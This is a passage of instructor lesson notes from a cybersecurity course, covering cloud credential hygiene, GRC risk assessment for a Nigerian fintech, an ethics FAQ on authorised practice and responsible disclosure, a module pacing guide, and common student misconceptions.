- Your application code running on EC2 — absolutely your responsibility

Most cloud breaches happen in the CUSTOMER's responsibility zone. Not the provider's.

The attacker doesn't break into AWS. They break into your AWS account. They find a developer pushed AWS access keys to GitHub. The keys have admin privileges. The attacker runs `aws s3 ls` and sees all your buckets. Downloads everything in 20 minutes.

Never hardcode AWS credentials. Use IAM roles. Enable MFA on the root account. Enable CloudTrail logging. These are non-negotiable."

---

# MODULE 12 [PROFESSIONAL]: GRC AND THE FUTURE
## Full Teaching Script

> **Level: Professional** | Estimated teaching time: 6 hours (2 sessions × 3 hours)

---

### Opening: Security as a Business Function (10 minutes)

"Here is a fundamental truth that will define your career.

Every security programme, every security investment, every security policy exists in a business context. Security is not an end in itself — it is a means to protect business value.

The CISO who says 'We need to spend ₦500M on security because security is important' will be ignored.

The CISO who says 'Our current vulnerability profile is similar to Equifax before their 2017 breach. A comparable breach would cost us ₦2.4B in regulatory fines, customer compensation, and reputational damage. Our proposed ₦120M investment in 5 specific controls reduces this risk by 65% — a 1,300% ROI' gets the investment approved.

Learn to speak business. Calculate risk in Naira. Connect security to revenue, reputation, regulation. That is the difference between a security technician and a security executive."

---

### Teaching Moment: Risk Assessment — Walking Through the Math

"Risk = Threat × Vulnerability × Impact

Let me calculate a real risk for a Nigerian fintech.

**Asset:** Customer database containing 2 million records (BVN, account details, transaction history)

**Threat:** SQL injection attack by financially-motivated attacker

**Vulnerability:** The web application was last penetration tested 18 months ago. Known framework vulnerabilities have not been patched (3 critical CVEs open for 6 weeks).

**Likelihood assessment (1–5):**
- Is this asset targeted? (Banks/fintechs = YES) = 4
- Is this vulnerability exploitable? (Publicly known CVEs = YES) = 4
- Does the attacker have motivation? (2M records = enormous monetisable value) = 5
- Likelihood = 4 × 4 × 5 / 10 = 8 (out of 10)

**Impact assessment (1–5):**
- NDPA 2023 fine: up to ₦10M or 2% of revenue
- Customer compensation
- Reputational damage (customer churn estimated at 15%)
- Regulatory sanction from CBN
- Impact = 5 (Critical)

**Risk score:** 8 × 5 = 40 (out of 50) = CRITICAL risk

**Treatment:** Cannot accept (too high). Cannot avoid (need the database). Transfer (cyber insurance — get it). Mitigate: 
- Emergency patching of 3 critical CVEs (72 hours)
- Emergency penetration test (2 weeks)
- WAF deployment (1 week)

This is how security professionals communicate with boards. Not 'we have vulnerabilities.' But: 'here is the probability, here is the ₦ impact, here is what we're doing about it.'"

---

### Teaching Moment: Your Role in Nigeria's Cybersecurity Future

"I want to end this course with something important.

Nigeria is one of the most digitally active countries in Africa. Mobile money. Fintech. E-government. Digital health records. All coming. All being targeted.

The ngCERT (Nigeria Computer Emergency Response Team) exists but is underfunded. NITDA issues guidelines but enforcement is limited. The CBN framework is solid but many banks lack professionals to implement it.

The deficit of trained cybersecurity professionals in Nigeria — professionals who understand both the technical realities and the Nigerian context — is enormous.

YOU are the answer to that deficit.

Every one of you who leaves this programme and goes to work protecting a Nigerian fintech, bank, hospital, or government system is making Nigeria safer. Every one of you who builds a security team, trains employees, implements a SIEM, responds to an incident with competence — you are building the digital immune system of a nation.

This is not a small thing.

Get the MetaBridge certificate. Get CompTIA Security+. Get CEH. Build a portfolio. Join the ngCERT community. Contribute to open-source security tools.

And never stop learning. Cybersecurity is the one field where what you know on graduation day has a shorter half-life than almost any other profession. The threat landscape changes monthly. The professional who keeps learning — always — is the professional who stays valuable.

Welcome to the profession."

---

# INSTRUCTOR FAQ — CYBERSECURITY

**Q: A student asks if they can practise hacking on a website they found with vulnerabilities.**
A: Absolutely not. The fact that a vulnerability exists does not grant permission to exploit it. Practise on TryHackMe, HackTheBox, or your own VMs only. Report vulnerabilities through responsible disclosure channels (contact the organisation directly or use a bug bounty programme).

**Q: A student asks about cracking WiFi passwords for fun at home.**
A: Only on your own network that you own. Even cracking the WiFi of a neighbour "just to see if you can" is illegal. The Cybercrimes Act 2015 doesn't care about your intentions — only your authorisation.

**Q: A student says they want to build a botnet "just to understand how it works."**
A: Understanding botnets is fine — through academic resources, security research, and simulation labs. Actually building infrastructure that connects to real victim machines is criminal. Students can simulate botnet behaviour in isolated VM environments only.

**Q: A student asks about bypassing MDM on a corporate phone they were issued.**
A: That phone belongs to their employer. MDM is implemented by the employer for their legitimate purposes. Bypassing it without authorisation is an employment violation and potentially criminal. If they believe the MDM is overly invasive, raise it through HR.

**Q: A student found credentials for a Nigerian government system while doing OSINT research. What should they do?**
A: This is a responsible disclosure situation. They should NOT test the credentials to see if they work (that would be unauthorised access). They should contact the organisation directly (cybersecurity@nitda.gov.ng for government systems) and report the finding. Document the finding but do not access the system.

---

# PACING GUIDE — 12 MODULES

| Module | Title | Duration | Priority Labs |
|--------|-------|----------|---------------|
| 1 | Introduction & CIA Triad | 3 hours | Lab 1.1 VirusTotal, Lab 1.3 TryHackMe |
| 2 | Networking Fundamentals | 4 hours | Lab 2.1 Wireshark, Lab 2.2 Nmap |
| 3 | Linux & Command Line | 4 hours | Lab 3.1 Kali Setup, Lab 3.2 Log Analysis |
| 4 | Cryptography & PKI | 4 hours | Lab 4.1 CyberChef, Lab 4.2 Certificates |
| 5 | Network Security | 4 hours | Lab 5.2 Shodan, Lab 5.3 Nmap |
| 6 | Ethical Hacking | 4 hours | Lab 6.2 TryHackMe Pentest, Lab 6.3 ANY.RUN |
| 7 | Web App Security | 5 hours | Lab 7.1 SQLi, Lab 7.2 XSS |
| 8 | Social Engineering | 3 hours | Lab 8.1 Phishing Analysis, Lab 8.3 Email Auth |
| 9 | Malware Analysis | 4 hours | Lab 9.2 ANY.RUN Dynamic Analysis |
| 10 | Incident Response | 4 hours | Tabletop Exercise, Lab 10.2 Log Analysis |
| 11 | Cloud Security | 4 hours | Lab 11.1 Flaws.cloud |
| 12 | GRC & Future | 3 hours | Lab 12.1 Risk Assessment |

**Total contact hours: ~46 hours**
**Recommended schedule: 2 × 3-hour sessions per week = 8 weeks**

---

# COMMON MISTAKES TO PROACTIVELY ADDRESS

| Mistake | Correct Understanding |
|---|---|
| "I tested that company's website to help them" | Unauthorised testing is illegal regardless of intent. Use responsible disclosure. |
| "Strong passwords are enough for security" | Passwords fail. MFA is the minimum. Zero Trust is the goal. |
| "HTTPS means the site is safe/trustworthy" | HTTPS means the connection is encrypted. The site itself can still be malicious. |
| "We're too small for hackers to target" | Automated scanning tools don't discriminate by company size. |
| "I backed up my data — ransomware can't hurt me" | Ransomware groups test backup systems and encrypt/delete them too. Offline backups needed. |
| "VPNs make you anonymous online" | VPNs hide traffic from your ISP and local network. The VPN provider still sees it. |
| "I can tell a phishing email by its poor grammar" | Sophisticated spear phishing uses perfect grammar and personalised information. |
| "AV software is all you need" | Antivirus catches known malware. Zero-days, fileless malware, and Living-off-the-land attacks often evade AV. |

---

*MetaBridge Academy Cybersecurity — Lesson Notes | For Instructor Use Only | metabridgeacademy.com*
*Textbook reference: Cybersecurity Sefer — available at metabridgeacademy.com*
*All enrolment: https://wa.me/2347034357206*
